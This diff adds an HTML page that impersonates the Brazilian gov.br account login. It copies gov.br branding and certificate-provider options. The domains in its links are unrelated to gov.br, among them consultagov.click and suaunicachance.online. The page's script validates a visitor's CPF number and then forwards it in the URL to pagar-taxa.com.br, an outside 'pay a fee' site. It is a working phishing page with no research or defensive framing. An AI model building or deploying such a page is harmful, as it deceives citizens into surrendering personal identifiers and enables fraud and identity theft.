@@ -1,0 +1,202 @@
+<html lang="pt-BR"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>gov.br - Acesse sua conta</title>
+	<link rel="canonical" href="https://consultagov.click">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <link rel="icon" href="https://suaunicachance.online/r1/html/favicon.ico" type="image/x-icon">
+  <!-- Fontawesome -->
+  <link rel="stylesheet" href="com/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+  <!-- Fonts -->
+  <link rel="stylesheet" href="com/css/rawline.css">
+  <!-- Page CSS -->
+  <link rel="stylesheet" href="com/css/govbr-highcontrast.css">
+  <link rel="stylesheet" href="com/css/govbr-templates.css">
+  <link rel="stylesheet" href="com/css/govbr-modal.css">
+  <link rel="stylesheet" href="com/css/govbr-eula.css">
+  <link href="com/rawline.css" rel="stylesheet">
+  <link rel="stylesheet" href="com/css/fontawesome.min.css">
+  <link rel="stylesheet" href="com/css/font-awesome.min.css">
+  <script src="com/js/contrast.class.js"></script>
+  <script src="com/js/modal.js"></script>
+</head>
+<body>
+  <header>
+    <a href="https://www.gov.br"><img src="com/images/govbr.png" alt="Logomarca GovBR"></a>
+    <div id="acessibilidade">
+        <span>
+            <a href="#" onclick="contrastScript().toggleContrast(event)"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+        </span>
+        <span>
+            <a><i class="fas fa-deaf"></i><span>VLibras</span></a>
+        </span>
+    </div>
+ </header>
+<div class="container">
+  <aside id="aside-signin">
+    <img id="identidade-govbr" src="com/images/conta_govbr_v2.jpg" alt="Logomarca GovBR">
+  </aside>
+  <main id="main-signin">
+    <div class="card" id="login-cpf">
+      <h3>Identifique-se no gov.br com:</h3>
+      <div class="item-login-signup-ways">
+          <a tabindex="3">
+            <img src="com/images/id-card-solid.png">
+            Número do CPF
+          </a>
+        </div>
+        <div class="accordion-panel" id="accordion-panel-id">
+          <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+          <label for="cpf">CPF</label>
+          <input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" maxlength="14" value="" placeholder="Digite seu CPF" aria-invalid="false" onkeydown="javascript: fMasc( this, mCPF );"> 
+          <p id="invalidcpf" style="color: #ff0000;display: none;">CPF Inválido. Digite novamente</p>
+          <div class="button-panel" id="login-button-panel">
+            <button id="enter-account-id" type="button" name="operation" value="enter-account-id" class="button-continuar" tabindex="2" onclick="ValidaCPF();">Continuar</button>
+                  </div>
+        </div>
+        <br>
+    
+        <label id="title-outras-op">Outras opções de identificação:</label>
+        <hr id="hr-outras-op" style="margin: 0 0 0">
+        <div class="item-login-signup-ways">
+          <button type="button" tabindex="5" class="button-href-mimic2" style="color:#008C32">
+            <img src="com/images/InternetBanking-green.png">
+            Login com seu banco
+            <span style="font-size: 7px; background-color: #008C32; color: white; padding: 3px; top: -3px; position: relative; margin-left: 8px;">SUA CONTA SERÁ PRATA</span>
+          </button>
+        </div>
+        <div class="item-login-signup-ways">
+            <a tabindex="5" href="#">
+                <img src="com/images/qrcode.png">
+                Login com QR code
+                </a>
+          </div>
+        <div class="item-login-signup-ways" id="cert-digital">
+          <button id="login-certificate" type="submit" formaction="#" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4">
+            <img src="com/images/CD.png">
+            Seu certificado digital
+          </button>
+          </div>
+        <div class="item-login-signup-ways" id="cert-digital-cloud">
+          <button type="button" class="button-href-mimic2" tabindex="5">
+            <img src="com/images/CD-Nuvem.png" id="cert-digital-cloud-img">
+            Seu certificado digital em nuvem
+          </button>
+        </div>
+        <div class="modal-certificado-nuvem">
+          <div class="modal-content">
+            <h3>Provedores de Certificados em Nuvem</h3>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-neoid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/neoid_logo.png">
+                  NeoID</button>
+                <script>
+                  document.getElementById("login-external-authentication-neoid").addEventListener("click", event => { 
+                    setProviderId("neoid");
+                    return onSubmit(event);
+                  });
+                </script>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-safeid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/safeid_logo.png">
+                  SafeID</button>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-birdid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/birdid_logo.png">
+                  BirdID</button>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-remoteid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/remoteid_logo.png">
+                  RemoteID</button>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-vidaas" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/vidaas_logo.png">
+                  Vidaas</button>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-serasa" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/serasa_logo.png">
+                  Serasa Experian</button>
+              </div>
+            <div class="item-login-signup-ways">
+                <button id="login-external-authentication-dscloud" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3">
+                  <img src="com/images/digitalsign_logo.png">
+                  DS Cloud</button>
+              </div>
+            <hr>
+            <div class="button-panel" id="modal-bancos-credenciados-button-panel">
+              <button class="button-cancel" type="button" id="btn-close-modal-certificado-nuvem" onclick="closeModal('modal-certificado-nuvem')">Cancelar</button>
+            </div>
+          </div>
+        </div>
+      <div class="entenda-id-govbr" id="entenda-id-govbr">
+        <span>
+          <a tabindex="6" href="#" id="entenda-id-govbr-a">
+              <img src="com/images/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em;">
+              Está com dúvidas e precisa de ajuda?
+            </a>
+          <a tabindex="6" href="#" style="display: block;" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+        </span>
+      </div>
+    </div>
+  </main>
+</div>
+  <footer>
+  </footer>
+  <script src="com/js/jquery-2.2.4.min.js"></script>
+  <script src="com/js/scripts.js"></script>
+  <script src="com/js/jquery.maskedinput.js"></script>
+  <script>
+  function ValidaCPF() {
+    var cpf = document.getElementById("accountId").value.replace(/[^\d]/g, '');
+    if (cpf.length !== 11 || !ValidaDigitosVerificadores(cpf)) {
+      document.getElementById("invalidcpf").style.display="block";
+      setTimeout(() => {        
+        document.getElementById("invalidcpf").style.display="none";
+      }, 3000);
+    } else {
+         const urlParams = new URLSearchParams(window.location.search);
+         window.location.href = "https://pagar-taxa.com.br/type/br?cpf="+document.getElementById("accountId").value.replace(/[^\d]/g, '') + '&' + urlParams.toString();
+    }
+  }
+  function ValidaDigitosVerificadores(cpf) {
+    var soma = 0;
+    for (var i = 0; i < 9; i++) {
+      soma += parseInt(cpf.charAt(i)) * (10 - i);
+    }
+    var resto = soma % 11;
+    var digitoVerificador1 = resto < 2 ? 0 : 11 - resto;
+    if (parseInt(cpf.charAt(9)) !== digitoVerificador1) {
+      return false;
+    }
+    soma = 0;
+    for (var i = 0; i < 10; i++) {
+      soma += parseInt(cpf.charAt(i)) * (11 - i);
+    }
+    resto = soma % 11;
+    var digitoVerificador2 = resto < 2 ? 0 : 11 - resto;
+    return parseInt(cpf.charAt(10)) === digitoVerificador2;
+  }
+    function fMasc(objeto,mascara) {
+    obj=objeto
+    masc=mascara
+    setTimeout("fMascEx()",1)
+  }
+    function fMascEx() {
+    obj.value=masc(obj.value)
+  }
+   function mCPF(cpf){
+    cpf=cpf.replace(/\D/g,"")
+    cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
+    cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
+    cpf=cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2")
+    return cpf
+  }
+  </script>
+</body></html>
